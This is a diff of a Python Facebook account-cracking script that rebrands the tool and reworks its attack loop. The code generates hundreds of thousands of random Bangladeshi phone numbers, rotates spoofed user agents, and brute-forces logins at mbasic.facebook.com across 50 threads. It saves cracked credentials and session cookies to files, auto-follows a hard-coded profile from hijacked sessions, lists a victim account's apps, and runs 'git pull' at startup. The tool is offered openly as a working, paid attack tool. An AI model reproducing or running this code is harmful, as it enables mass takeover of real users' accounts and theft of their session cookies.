@@ -1,17 +1,11 @@
-#SC MAKED BY PARVEJ
-#Fuck PARVEJ HOSSEN
-#Dec By PARVEJ
-#PARVEJ Your Reyal Pappa
-#PARVEJ Kids Numbar 5
-
 import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
 from datetime import date
 from datetime import datetime
 from time import sleep
-from os import system as s
 from time import sleep as waktu
 try:
     import requests
@@ -21,6 +15,45 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
+    
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\\033[1;91m [✔] Sorry there is no Active  Apk ')
+    else:
+        print(f'\r \033[1;92m[✔] Your Active Apps :{WHITE}' )
+        for i in range(len(game)):
+            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\\033[1;91m [✔] Sorry there is no Expired Apk\n')
+    else:
+        print(f'\\033[1;92m [✔] Your Expired Apps   :{WHITE}')
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://mbasic.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
 RED = '\033[1;91m'
 WHITE = '\033[1;97m'
 GREEN = '\033[1;32m' #
@@ -44,27 +77,73 @@ BK = '\x1b[1;103m' # BELAKANG KUNING
 BH = '\x1b[1;102m' # BELAKANG HIJAU
 BM = '\x1b[1;101m' # BELAJANG MERAH
 BA = '\x1b[1;100m' # BELAKANG ABU ABU
+
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
 now = datetime.now()
 dt_string = now.strftime("%H:%M")
 current = datetime.now()
 ta = current.year
 bu = current.month
 ha = current.day
-today = date.today() 
+today = date.today()
+logo ="""
+     █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗    
+██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║    
+███████║█████╔╝ ███████║███████╗███████║    
+██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║    
+██║  ██║██║  ██╗██║  ██║███████║██║  ██║    
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                   
+                                   
+\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mVIRUS\033[1;39m━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★]AKASH\033[1;39m         ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★]A. AKASH DAS\033[1;39m         ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★]AKASH\033[1;39m       ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+𝟴𝟴𝟬𝟭754043675\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗣𝗥𝗜𝗠𝗜𝗨𝗠\033[1;39m            ┃
+ \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31mTEAM\033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""
 loop = 0
 oks = []
 cps = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
+
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+ 
 try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
- open('.prox.txt','w').write(prox)
-except Exception as e:
- print('')
-prox=open('.prox.txt','r').read().splitlines()
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m CANTACK ME...')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Plz seaport ME...')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m jone my fb group ...')
+    time.sleep(3)
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('xdg-open https://facebook.com/groups/528058202631155/')
+    else:pass
+except:print('\n \033[1;91m[\033[1;92m✔\033[1;91m] No internet connection ...')
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+
+ugen2 = []
+ugen = []
+ 
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -80,145 +159,82 @@ for xd in range(10000):
     l='Mobile Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
-logo = ("""
-\033[1;33m d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
-\033[1;33m 88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
-\033[1;32m 88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
-\033[1;32m 88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
-\033[1;36m 88      88   88 88 `88.  `8bd8'  88.     db. 88  
-\033[1;36m 88      YP   YP 88   YD    YP    Y88888P Y8888P  
-                                                 
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m
-
-\033[1;92m══════════════════════════════════════════
-\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
-\033[1;32m[-] AUTHOR    :\033[1;32m PARVEJ HOSSEN
-\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
-\033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
-\033[1;92m══════════════════════════════════════════
-
-\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
-
-
-class Main:
-    def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.loop = 0
-        os.system("clear")
-        print(logo)
-        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-        print(" \033[1;97m[1] FACEBOOK EMAIL ID CLONING     \033[1;91m[WORKING] ")
-        print(" \033[1;97m[2] FACEBOOK USERNAME CLONING     \033[1;35m[BEST]")
-        print(" \033[1;97m[3] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
-        print(" \033[1;97m[0] Exit")
-        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-        Snigdho =input(" [√] Choose : ")
-        if Snigdho in ["1", "01"]:
-            v1()
-        if Snigdho in ["2", "02"]:
-            v2()
-        if Snigdho in ["3","03"]:
-            v3()
-        if Snigdho in [" 0", "00"]:
-            exit()
-        else:
-            exit()
-def v1():
-    user=[]
-    os.system('clear')
-    print(logo)
-    kode = input(' [🔥]  TERGET FIRST NAME : ')
-    kodex = input(' [🔥] TERGET LAST NAME :  ')
-    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
-    doamin = input(' [📧]  Input Doamin  : ')
-    limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' [🔥]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [🔥]  Target Doamin:\033[1;92m {doamin}")
-        print(' \033[1;97m[🔥]  The process has been started')
-        print(' [🔥]  Wait for ids ')
-        print(50*'_')
-        for guru in user:
-            uid = kode+kodex+guru+doamin
-            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
-    print(50*'_')
-def v2():
-    user=[]
-    os.system('clear')
-    print(logo)
-    kode = input(' [🔥]  TERGET FIRST NAME : ')
-    kodex = input(' [🔥] TERGET FIRST NAME :  ')
-    doamin = '.'
-    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' [🔥]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [♥]  Target Doamin:\033[1;92m Facebook CLONING (name)")
-        print(' \033[1;97m[♥]  The process has been started')
-        print(' [♥]  Wait for ids ')
-        print(50*'_')
-        for guru in user:
-            uid = kode+doamin+kodex+guru
-            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
-    print(50*'_')
-def v3():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
-    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
-    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
-    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
-    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
     
-    kode = input(' [📞] ENTER SIM CODE: ')
-    kodex = ''.join(random.choice(string.digits) for _ in range(2))
-    kod = ''.join(random.choice(string.digits) for _ in range(2))
-    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
-    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
+for agent in range(random.randint(89999, 100000)):
+    a='Mozilla/5.0 (iPod/'
+    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
+    a1='; CPU iPhone OS'
+    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
+    n='like Mac OS X)'
+    c=random.randrange(7,12)
+    m='en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(100,999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/'
+    o=random.randrange(533,605)
+    p='1'
+    q=random.randrange(10,99)
+    r='(KHTML, like Gecko) Chrome/'
+    h=random.randrange(10,99)
+    i='0'
+    j=random.randrange(1000,9999)
+    k=random.randrange(10,99)
+    l='GSA/'
+    ll=random.randrange(155,159)
+    l1=random.randrange(1,9)
+    l2=random.randrange(111111111,999999999)
+    l3='Mobile/'
+    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
+    l5='Safari/'
+    s=random.randrange(535,605)
+    t=random.randrange(1,9)
+    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
+    ugen.append(fullagent)
+    
+def news():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 <<')
+    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m CHOOSE GP CODE\033[1;91m>>\033[1;92m ')
+    limit = 500000
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
+    os.system("clear")
+    print(logo)
+    passx = 0
+    RimonID = []
+    print("")
+    for bilal in range(passx):
+        pww = 0
+        RimonID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
         tl = str(len(user))
-        print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m '+tl)
-        print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
-        print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
-        print(' \033[1;33m[♥]  WAIT FOR IDS ')
-        print(50*'_')
-        for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
-    print(50*'_')
-def rcrack1(uid,pwx,tl):
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m YOUR SLECTED SIM \033[1;91m>>\033[1;96m '+code)
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
+        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in RimonID:
+                pwx.append(Eman)
+                pwx.append(love)
+            manshera.submit(new,uid,pwx,tl)
+    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in KING/ok.txt,KING/cp.txt')
+    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+
+def new(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -227,9 +243,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mPARVEJ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
-            sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -241,45 +255,47 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-    'authority': 'm.facebook.com',
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'no-cache',
-    # 'cookie': 'datr=E74nZPAr1N4lHnO5Z23vj8-3; sb=E74nZEslp3CcUIIi8Pt81iCR; m_pixel_ratio=1.75; wd=412x805; fr=0qe97yfeoNUBkUDS1..BkJ74b.MC.AAA.0.0.BkJ75G.AWV8YvT3ZUw',
-    'pragma': 'no-cache',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
     'referer': 'https://www.google.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.1.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'cross-site',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+    'viewport-width': '980',
 }
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print(f"\033[38;5;46m[PARVEJ-OK🌻] {uid}|{ps}")
-                print(f"\n[COOKIE🎁] : {coki}")
-                open('/sdcard/PARVEJ/ok.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(uid)
+                cid = coki[65:80]
+                print(' \n\x1b[38;5;196m[\x1b[38;5;46mVIRUS\x1b[38;5;196m]\x1b[38;5;46m ' +uid+ '\x1b[38;5;46m  ✔  \x1b[38;5;46m' +ps+ '\n  COOKIES\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m '+coki+'')                
+                open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
-                open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
+                cid = coki[65:80]
+                print('[CP] ' +uid+ '|' +ps+ '')
+                open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
+                cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mVIRUS\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
         sys.stdout.flush()
     except:
         pass
-Main()
+
+news()
